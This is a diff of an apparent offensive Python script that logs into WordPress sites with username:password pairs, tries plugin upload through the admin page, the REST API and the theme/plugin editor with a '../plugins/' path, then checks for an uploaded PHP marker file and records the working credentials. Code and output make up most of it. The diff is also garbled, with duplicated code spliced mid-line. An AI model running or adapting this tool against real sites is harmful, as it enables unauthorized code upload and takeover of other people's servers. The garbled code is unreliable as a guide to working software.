@@ -882,6 +882,7 @@ def test_plugin_upload(url, login_path, username, password, timeout, upload_outp
                                 successful_uploads.append(("Direct Admin Upload", test_url))
                                 print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - Direct Admin Upload - {test_url}", "success")
                                 write_plugin_upload_success(upload_output_file, url, username, password, "Direct Admin Upload", test_url)
+        except Exception:
             upload_methods_tested.append("Direct Admin Upload (Failed)")
 
         # Method 2: REST API upload (if available)
@@ -964,119 +965,6 @@ echo "kishoriya";
                             if create_response.status_code == 200:
                                 # Test if the plugin file is accessible
                                 test_url = f"{url}{wp_base_path}/wp-content/plugins/kishore/hello.php"
-                                test_response = session.get(test_url, timeout=timeout, verify=False)
-                                if test_response.status_code == 200 and 'kishoriya' in test_response.text:
-                                    successful_uploads.append(("File Manager Upload", test_url))
-                                    print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - File Manager Upload - {test_url}", "success")
-                                    write_plugin_upload_success(upload_output_file, url, username, password, "File Manager Upload", test_url)
-                        break
-        except Exception:
-            upload_methods_tested.append("File Manager Upload (Failed)")
-
-    except Exception as e:
-        print_status(f"Error during plugin upload test: {str(e)}", "error")
-
-    return upload_methods_tested, successful_uploadsadmin/update.php?action=upload-plugin",
-                        data=form_data,
-                        files=files,
-                        timeout=timeout,
-                        verify=False
-                    )
-                    
-                    upload_methods_tested.append("Direct Admin Upload")
-                    
-                    if upload_response.status_code == 200:
-                        if 'Plugin installed successfully' in upload_response.text or 'successfully' in upload_response.text.lower():
-                            # Test if the plugin file is accessible
-                            test_url = f"{url}/wp-content/plugins/kishore/hello.php"
-                            test_response = session.get(test_url, timeout=timeout, verify=False)
-                            if test_response.status_code == 200 and 'kishoriya' in test_response.text:
-                                successful_uploads.append(("Direct Admin Upload", test_url))
-                                print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - Direct Admin Upload - {test_url}", "success")
-                                write_plugin_upload_success(upload_output_file, url, username, password, "Direct Admin Upload", test_url)
-        except Exception:
-            upload_methods_tested.append("Direct Admin Upload (Failed)")
-
-        # Method 2: REST API upload (if available)
-        try:
-            rest_upload_url = f"{url}/wp-json/wp/v2/plugins"
-            plugin_zip = create_test_plugin_zip()
-            
-            headers_rest = {
-                'User-Agent': get_random_user_agent(),
-                'Content-Type': 'application/zip',
-                'Content-Disposition': 'attachment; filename="kishore.zip"'
-            }
-            
-            rest_response = session.post(
-                rest_upload_url,
-                data=plugin_zip,
-                headers=headers_rest,
-                timeout=timeout,
-                verify=False
-            )
-            
-            upload_methods_tested.append("REST API Upload")
-            
-            if rest_response.status_code in [200, 201]:
-                # Test if the plugin file is accessible
-                test_url = f"{url}/wp-content/plugins/kishore/hello.php"
-                test_response = session.get(test_url, timeout=timeout, verify=False)
-                if test_response.status_code == 200 and 'kishoriya' in test_response.text:
-                    successful_uploads.append(("REST API Upload", test_url))
-                    print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - REST API Upload - {test_url}", "success")
-                    write_plugin_upload_success(upload_output_file, url, username, password, "REST API Upload", test_url)
-        except Exception:
-            upload_methods_tested.append("REST API Upload (Failed)")
-
-        # Method 3: File manager / direct file upload
-        try:
-            file_manager_urls = [
-                f"{url}/wp-admin/theme-editor.php",
-                f"{url}/wp-admin/plugin-editor.php"
-            ]
-            
-            for fm_url in file_manager_urls:
-                fm_response = session.get(fm_url, timeout=timeout, verify=False)
-                if fm_response.status_code == 200 and 'wp-login.php' not in fm_response.url:
-                    if 'theme-editor' in fm_response.text or 'plugin-editor' in fm_response.text:
-                        # Try to create plugin via editor
-                        nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', fm_response.text)
-                        if nonce_match:
-                            nonce = nonce_match.group(1)
-                            
-                            plugin_content = '''<?php
-/**
- * Plugin Name: Kishore Test Plugin
- * Description: Simple test plugin for security testing
- * Version: 1.0
- */
-if (!defined('ABSPATH')) exit;
-echo "kishoriya";
-?>'''
-                            
-                            # Attempt to create the plugin file
-                            create_data = {
-                                '_wpnonce': nonce,
-                                'action': 'edit-theme-plugin-file',
-                                'file': '../plugins/kishore/hello.php',
-                                'newcontent': plugin_content,
-                                'docs-list': '',
-                                'submit': 'Update File'
-                            }
-                            
-                            create_response = session.post(
-                                fm_url,
-                                data=create_data,
-                                timeout=timeout,
-                                verify=False
-                            )
-                            
-                            upload_methods_tested.append("File Manager Upload")
-                            
-                            if create_response.status_code == 200:
-                                # Test if the plugin file is accessible
-                                test_url = f"{url}/wp-content/plugins/kishore/hello.php"
                                 test_response = session.get(test_url, timeout=timeout, verify=False)
                                 if test_response.status_code == 200 and 'kishoriya' in test_response.text:
                                     successful_uploads.append(("File Manager Upload", test_url))
